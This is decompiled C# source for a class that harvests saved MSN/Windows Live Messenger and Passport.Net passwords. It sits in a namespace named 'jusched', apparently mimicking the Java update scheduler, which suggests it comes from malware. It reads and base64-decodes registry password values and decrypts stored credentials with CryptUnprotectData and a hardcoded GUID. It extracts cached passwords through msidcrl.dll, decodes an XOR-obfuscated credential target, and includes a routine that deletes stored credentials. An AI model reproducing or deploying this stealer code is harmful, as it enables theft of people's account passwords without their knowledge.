using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace jusched;

internal class _PASSWORD__s : CUtils, IEnumerable<_PASSWORD__>
{
	private enum CRED_TYPE
	{

	}

	private struct DATA_BLOB
	{
		public int cbData;

		public int pbData;
	}

	private struct FILETIME
	{
		public int dwLowDateTime;

		public int dwHighDateTime;
	}

	private struct CREDENTIAL_ATTRIBUTE
	{
		public int lpstrKeyword;

		public int dwFlags;

		public int dwValueSize;

		public int lpbValue;
	}

	private struct CREDENTIAL
	{
		public int dwFlags;

		public int dwType;

		public int lpstrTargetName;

		public int lpstrComment;

		public FILETIME ftLastWritten;

		public int dwCredentialBlobSize;

		public int lpbCredentialBlob;

		public int dwPersist;

		public int dwAttributeCount;

		public int lpAttributes;

		public int lpstrTargetAlias;

		public int lpUserName;
	}

	private struct MSNPass
	{
		public string strLogin;

		public string strPass;

		public string strTargetName;
	}

	private const int ERROR_SUCCESS = 0;

	private const int HKEY_CURRENT_USER = -2147483647;

	private const int READ_CONTROL = 131072;

	private const int STANDARD_RIGHTS_READ = 131072;

	private const int KEY_QUERY_VALUE = 1;

	private const int KEY_ENUMERATE_SUB_KEYS = 8;

	private const int KEY_NOTIFY = 16;

	private const int SYNCHRONIZE = 1048576;

	private const int STANDARD_RIGHTS_WRITE = 131072;

	private const int KEY_SET_VALUE = 2;

	private const int KEY_CREATE_SUB_KEY = 4;

	private const int KEY_READ = 131097;

	private const int KEY_WRITE = 131078;

	private const int CSIDL_PROGRAM_FILES = 38;

	private List<_PASSWORD__> m_MSNPass;

	[SpecialName]
	private byte[] _0024STATIC_0024Base64Dec_0024201E10E_0024Enc;

	public _PASSWORD__s()
	{
		m_MSNPass = new List<_PASSWORD__>();
	}

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int lstrlenA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1, ref IntPtr intptr_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "CredEnumerateW", ExactSpelling = true, SetLastError = true)]
	private static extern int CredEnumerateW_1(IntPtr intptr_0, int int_0, ref int int_1, ref IntPtr intptr_1);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredDeleteW([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, int int_1);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CredFree(IntPtr intptr_0);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref DATA_BLOB data_BLOB_0, int int_0, ref DATA_BLOB data_BLOB_1, int int_1, int int_2, int int_3, ref DATA_BLOB data_BLOB_2);

	[DllImport("crypt32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CryptUnprotectData(ref DATA_BLOB data_BLOB_0, int int_0, int int_1, int int_2, int int_3, int int_4, ref DATA_BLOB data_BLOB_1);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegOpenKeyExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, int int_2, ref int int_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, [MarshalAs(UnmanagedType.LPWStr)] string string_1, ref int int_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, EntryPoint = "RegQueryValueExA", ExactSpelling = true, SetLastError = true)]
	private static extern int RegQueryValueExA_1(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_1, ref int int_2, IntPtr intptr_0, ref int int_3);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegEnumKeyExA(int int_0, int int_1, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, ref int int_2, int int_3, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, int int_4, ref FILETIME filetime_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegDeleteValueA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LocalFree(int int_0);

	[DllImport("advapi32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RegCloseKey(int int_0);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetSpecialFolderLocation(int int_0, int int_1, ref int int_2);

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SHGetPathFromIDListA(int int_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Initialize(ref Guid guid_0, int int_0, int int_1);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string string_0, ref int int_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int NextIdentity(int int_0, ref IntPtr intptr_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int PassportFreeMemory(IntPtr intptr_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseEnumIdentitiesHandle(int int_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle([MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_0, ref int int_1);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CreateIdentityHandle(IntPtr intptr_0, int int_0, ref int int_1);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int HasPersistedCredential(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0, ref int int_1);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int RemovePersistedCredential(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetIdentityPropertyByName(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0, ref int int_1);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int BuildAuthTokenRequest(int int_0, [MarshalAs(UnmanagedType.LPWStr)] string string_0, int int_1, ref IntPtr intptr_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CloseIdentityHandle(int int_0);

	[DllImport("msidcrl.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int Uninitialize();

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

	[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int FreeLibrary(int int_0);

	private string getProgramFilesFolderPath()
	{
		int int_ = default(int);
		string result;
		if (SHGetSpecialFolderLocation(0, 38, ref int_) == 0)
		{
			string string_ = new string('\0', 512);
			int num = SHGetPathFromIDListA(int_, ref string_);
			result = Strings.Left(string_, checked(Strings.InStr(string_, "\0", (CompareMethod)0) - 1));
		}
		else
		{
			result = null;
		}
		LocalFree(int_);
		return result;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void getMSN75Passwords()
	{
		string string_ = getProgramFilesFolderPath() + "\\MSN Messenger\\msidcrl.dll";
		if (Operators.CompareString(FileSystem.Dir(string_, (FileAttribute)0), (string)null, false) == 0)
		{
			return;
		}
		int int_ = LoadLibraryA(ref string_);
		Guid guid_ = new Guid(1896408858, -26330, 20427, new byte[8] { 188, 201, 154, 157, 63, 50, 228, 35 });
		Initialize(ref guid_, 1, 15);
		int int_2 = default(int);
		IntPtr intptr_ = default(IntPtr);
		int int_3 = default(int);
		int int_4 = default(int);
		if (EnumIdentitiesWithCachedCredentials("ps:password", ref int_2) == 0)
		{
			IntPtr intptr_2 = default(IntPtr);
			for (int num = NextIdentity(int_2, ref intptr_); num == 0; num = NextIdentity(int_2, ref intptr_))
			{
				num = CreateIdentityHandle(intptr_, 255, ref int_3);
				if ((num == 0) & (intptr_ != IntPtr.Zero))
				{
					num = HasPersistedCredential(int_3, "ps:password", ref int_4);
					if (num == 0 && int_4 != 0)
					{
						checked
						{
							if (BuildAuthTokenRequest(int_3, "ps:password", 0, ref intptr_2) == 0)
							{
								string text = CopyString(intptr_2);
								int num2 = Strings.InStr(text, "<wsse:Password>", (CompareMethod)0) + 15;
								int num3 = Strings.InStr(text, "</wsse:Password>", (CompareMethod)0);
								if (num3 > 0)
								{
									List<_PASSWORD__> mSNPass = m_MSNPass;
									string string_2 = CopyString(intptr_);
									string string_3 = Strings.Mid(text, num2, num3 - num2);
									string string_4 = "ps:" + CopyString(intptr_);
									mSNPass.Add(new _PASSWORD__(ref string_2, ref string_3, ref string_4));
								}
							}
							if (intptr_2 != IntPtr.Zero)
							{
								PassportFreeMemory(intptr_2);
							}
						}
					}
					num = CloseIdentityHandle(int_3);
				}
				if (intptr_ != IntPtr.Zero)
				{
					PassportFreeMemory(intptr_);
				}
			}
		}
		CloseEnumIdentitiesHandle(int_2);
		if (EnumIdentitiesWithCachedCredentials("ps:membernameonly", ref int_2) == 0)
		{
			for (int num = NextIdentity(int_2, ref intptr_); num == 0; num = NextIdentity(int_2, ref intptr_))
			{
				num = CreateIdentityHandle(intptr_, 255, ref int_3);
				if ((num == 0) & (intptr_ != IntPtr.Zero))
				{
					num = HasPersistedCredential(int_3, "ps:password", ref int_4);
					if (num == 0 && int_4 == 0)
					{
						List<_PASSWORD__> mSNPass2 = m_MSNPass;
						string string_4 = CopyString(intptr_);
						string string_3 = string.Empty;
						string string_2 = "ps:" + CopyString(intptr_);
						mSNPass2.Add(new _PASSWORD__(ref string_4, ref string_3, ref string_2));
					}
					num = CloseIdentityHandle(int_3);
				}
				if (intptr_ != IntPtr.Zero)
				{
					PassportFreeMemory(intptr_);
				}
			}
		}
		CloseEnumIdentitiesHandle(int_2);
		Uninitialize();
		FreeLibrary(int_);
	}

	public void Refresh()
	{
		m_MSNPass.Clear();
		string string_ = "Software\\Microsoft\\MessengerService";
		int int_ = default(int);
		int num = RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_);
		int int_2 = 0;
		int int_3 = int_;
		string_ = "PasswordMSN Messenger Service";
		int int_4 = default(int);
		num = RegQueryValueExA_1(int_3, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
		checked
		{
			string text;
			if (int_2 > 0)
			{
				IntPtr intPtr = Marshal.AllocHGlobal(int_2);
				int int_5 = int_;
				string_ = "PasswordMSN Messenger Service";
				num = RegQueryValueExA_1(int_5, ref string_, 0, ref int_4, intPtr, ref int_2);
				text = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text = Strings.Mid(text, 1, Strings.Len(text) - 1);
				string string_2 = Base64Dec(ref text);
				int_2 = 0;
				int int_6 = int_;
				string_ = "UserMSN Messenger Service";
				num = RegQueryValueExA_1(int_6, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
				intPtr = Marshal.AllocHGlobal(int_2);
				int int_7 = int_;
				string_ = "UserMSN Messenger Service";
				num = RegQueryValueExA_1(int_7, ref string_, 0, ref int_4, intPtr, ref int_2);
				string text2 = Marshal.PtrToStringAnsi(intPtr);
				Marshal.FreeHGlobal(intPtr);
				text2 = Strings.Mid(text2, 1, Strings.Len(text2) - 1);
				List<_PASSWORD__> mSNPass = m_MSNPass;
				string_ = string.Empty;
				mSNPass.Add(new _PASSWORD__(ref text2, ref string_2, ref string_));
				RegCloseKey(int_);
			}
			RegCloseKey(int_);
			string_ = "Software\\Microsoft\\MSNMessenger";
			DATA_BLOB data_BLOB_ = default(DATA_BLOB);
			DATA_BLOB data_BLOB_2 = default(DATA_BLOB);
			if (RegOpenKeyExA(-2147483647, ref string_, 0, 131097, ref int_) == 0)
			{
				int_2 = 0;
				int int_8 = int_;
				string_ = "Password.NET Messenger Service";
				if (RegQueryValueExA_1(int_8, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2) == 0)
				{
					IntPtr intPtr = Marshal.AllocHGlobal(int_2);
					int int_9 = int_;
					string_ = "Password.NET Messenger Service";
					if (RegQueryValueExA_1(int_9, ref string_, 0, ref int_4, intPtr, ref int_2) != 0)
					{
						return;
					}
					data_BLOB_.pbData = intPtr.ToInt32() + 2;
					data_BLOB_.cbData = int_2 - 2;
					CryptUnprotectData(ref data_BLOB_, 0, 0, 0, 0, 1, ref data_BLOB_2);
					string string_3 = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					string string_4 = Base64Dec(ref string_3);
					int_2 = 0;
					int int_10 = int_;
					string_ = "User.NET Messenger Service";
					num = RegQueryValueExA_1(int_10, ref string_, 0, ref int_4, IntPtr.Zero, ref int_2);
					intPtr = Marshal.AllocHGlobal(int_2);
					int int_11 = int_;
					string_ = "User.NET Messenger Service";
					num = RegQueryValueExA_1(int_11, ref string_, 0, ref int_4, intPtr, ref int_2);
					string text3 = Marshal.PtrToStringAnsi(intPtr);
					Marshal.FreeHGlobal(intPtr);
					text3 = Strings.Mid(text3, 1, Strings.Len(text3) - 1);
					List<_PASSWORD__> mSNPass2 = m_MSNPass;
					string_ = string.Empty;
					mSNPass2.Add(new _PASSWORD__(ref text3, ref string_4, ref string_));
					LocalFree(data_BLOB_2.pbData);
				}
			}
			text = "Passport.Net\\*";
			int int_12 = default(int);
			IntPtr intptr_ = default(IntPtr);
			CredEnumerateW(text, 0, ref int_12, ref intptr_);
			CREDENTIAL cREDENTIAL = default(CREDENTIAL);
			CREDENTIAL cREDENTIAL2 = default(CREDENTIAL);
			int i;
			if (int_12 > 0)
			{
				DATA_BLOB data_BLOB_3 = default(DATA_BLOB);
				data_BLOB_3.cbData = 74;
				IntPtr intPtr2 = Marshal.AllocHGlobal(74);
				string text4 = "82BD0E67-9FEA-4748-8672-D5EFE5B779B0\0";
				int num2 = 0;
				do
				{
					Marshal.WriteInt16(intPtr2, num2 * 2, (short)(Strings.Asc(Strings.Mid(text4, num2 + 1, 1)) * 4));
					num2++;
				}
				while (num2 <= 36);
				data_BLOB_3.pbData = intPtr2.ToInt32();
				int num3 = int_12 - 1;
				for (i = 0; i <= num3; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(intptr_, i * 4);
					object? obj = Marshal.PtrToStructure(intPtr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj != null) ? ((CREDENTIAL)obj) : cREDENTIAL2);
					data_BLOB_.pbData = cREDENTIAL.lpbCredentialBlob;
					data_BLOB_.cbData = cREDENTIAL.dwCredentialBlobSize;
					data_BLOB_2.cbData = 0;
					data_BLOB_2.pbData = 0;
					CryptUnprotectData(ref data_BLOB_, 0, ref data_BLOB_3, 0, 0, 0, ref data_BLOB_2);
					List<_PASSWORD__> mSNPass3 = m_MSNPass;
					IntPtr intptr_2 = new IntPtr(cREDENTIAL.lpUserName);
					string_ = CopyString(intptr_2);
					IntPtr intptr_3 = new IntPtr(data_BLOB_2.pbData);
					string string_5 = CopyString(intptr_3);
					IntPtr intptr_4 = new IntPtr(cREDENTIAL.lpstrTargetName);
					string string_6 = CopyString(intptr_4);
					mSNPass3.Add(new _PASSWORD__(ref string_, ref string_5, ref string_6));
					LocalFree(data_BLOB_2.pbData);
				}
				Marshal.FreeHGlobal(intPtr2);
			}
			CredFree(intptr_);
			getMSN75Passwords();
			RegCloseKey(int_);
			byte[] array = new byte[18]
			{
				38, 48, 111, 102, 81, 101, 56, 82, 98, 108,
				78, 100, 103, 110, 90, 83, 85, 74
			};
			IntPtr intPtr3 = Marshal.AllocHGlobal(38);
			i = 0;
			do
			{
				byte val = (byte)(unchecked((int)checked((byte)(array[17 - i] ^ 0xC))) + (17 - i));
				Marshal.WriteInt16(intPtr3, i * 2, val);
				i++;
			}
			while (i <= 17);
			Marshal.WriteInt16(intPtr3, 36, 0);
			CredEnumerateW_1(intPtr3, 0, ref int_12, ref intptr_);
			if (int_12 > 0)
			{
				int num4 = int_12 - 1;
				for (i = 0; i <= num4; i++)
				{
					IntPtr intPtr = Marshal.ReadIntPtr(intptr_, i * 4);
					object? obj2 = Marshal.PtrToStructure(intPtr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj2 != null) ? ((CREDENTIAL)obj2) : cREDENTIAL2);
					data_BLOB_.pbData = cREDENTIAL.lpbCredentialBlob;
					data_BLOB_.cbData = cREDENTIAL.dwCredentialBlobSize;
					CryptUnprotectData(ref data_BLOB_, 0, 0, 0, 0, 1, ref data_BLOB_2);
					data_BLOB_2.pbData = data_BLOB_.pbData;
					List<_PASSWORD__> mSNPass4 = m_MSNPass;
					IntPtr intptr_4 = new IntPtr(cREDENTIAL.lpUserName);
					string string_6 = CopyString(intptr_4);
					IntPtr intptr_3 = new IntPtr(data_BLOB_2.pbData);
					string string_5 = Marshal.PtrToStringUni(intptr_3, (int)Math.Round((double)data_BLOB_.cbData / 2.0));
					IntPtr intptr_2 = new IntPtr(cREDENTIAL.lpstrTargetName);
					string_ = CopyString(intptr_2);
					mSNPass4.Add(new _PASSWORD__(ref string_6, ref string_5, ref string_));
				}
			}
			CredFree(intptr_);
			Marshal.FreeHGlobal(intPtr3);
		}
	}

	private void DeleteAllCred(string string_0)
	{
		int int_ = default(int);
		IntPtr intptr_ = default(IntPtr);
		CredEnumerateW(string_0, 0, ref int_, ref intptr_);
		checked
		{
			if (int_ > 0)
			{
				int num = int_ - 1;
				CREDENTIAL cREDENTIAL = default(CREDENTIAL);
				CREDENTIAL cREDENTIAL2 = default(CREDENTIAL);
				for (int i = 0; i <= num; i++)
				{
					IntPtr ptr = Marshal.ReadIntPtr(intptr_, i * 4);
					object? obj = Marshal.PtrToStructure(ptr, cREDENTIAL.GetType());
					cREDENTIAL = ((obj != null) ? ((CREDENTIAL)obj) : cREDENTIAL2);
					IntPtr intptr_2 = new IntPtr(cREDENTIAL.lpstrTargetName);
					string string_ = CopyString(intptr_2);
					CredDeleteW(string_, cREDENTIAL.dwType, cREDENTIAL.dwFlags);
				}
			}
			CredFree(intptr_);
		}
	}

	private string Base64Dec(ref string string_0)
	{
		byte[] array = new byte[256];
		if (_0024STATIC_0024Base64Dec_0024201E10E_0024Enc.Length == 0)
		{
			_0024STATIC_0024Base64Dec_0024201E10E_0024Enc = Encoding.ASCII.GetBytes("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/");
		}
		int num = 0;
		checked
		{
			do
			{
				array[num] = 64;
				num++;
			}
			while (num <= 255);
			num = 0;
			do
			{
				array[_0024STATIC_0024Base64Dec_0024201E10E_0024Enc[num]] = (byte)num;
				num++;
			}
			while (num <= 63);
			int num2 = Strings.Len(string_0);
			byte[] bytes = Encoding.ASCII.GetBytes(string_0);
			byte[] array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[unchecked(num2 / 4) * 3 - 1 + 1]);
			int num3 = Information.UBound((Array)bytes, 1);
			int num4 = default(int);
			for (num = 0; num <= num3; num += 4)
			{
				array2[num4] = (byte)((unchecked((int)array[bytes[num]]) * 4) | unchecked((int)array[bytes[checked(num + 1)]] / 16));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 1]] & 0xF) * 16) | unchecked((int)array[bytes[checked(num + 2)]] / 4));
				num4++;
				array2[num4] = (byte)(((short)(array[bytes[num + 2]] & 3) * 64) | array[bytes[num + 3]]);
				num4++;
			}
			num4 = ((bytes[num2 - 2] == 61) ? 2 : ((bytes[num2 - 1] == 61) ? 1 : 0));
			array2 = (byte[])Utils.CopyArray((Array)array2, (Array)new byte[Information.UBound((Array)array2, 1) - num4 + 1]);
			return Encoding.ASCII.GetString(array2);
		}
	}

	public IEnumerator<_PASSWORD__> GetEnumerator()
	{
		Refresh();
		return m_MSNPass.GetEnumerator();
	}

	public IEnumerator GetEnumerator1()
	{
		Refresh();
		return m_MSNPass.GetEnumerator();
	}

	IEnumerator IEnumerable.GetEnumerator()
	{
		//ILSpy generated this explicit interface implementation from .override directive in GetEnumerator1
		return this.GetEnumerator1();
	}
}
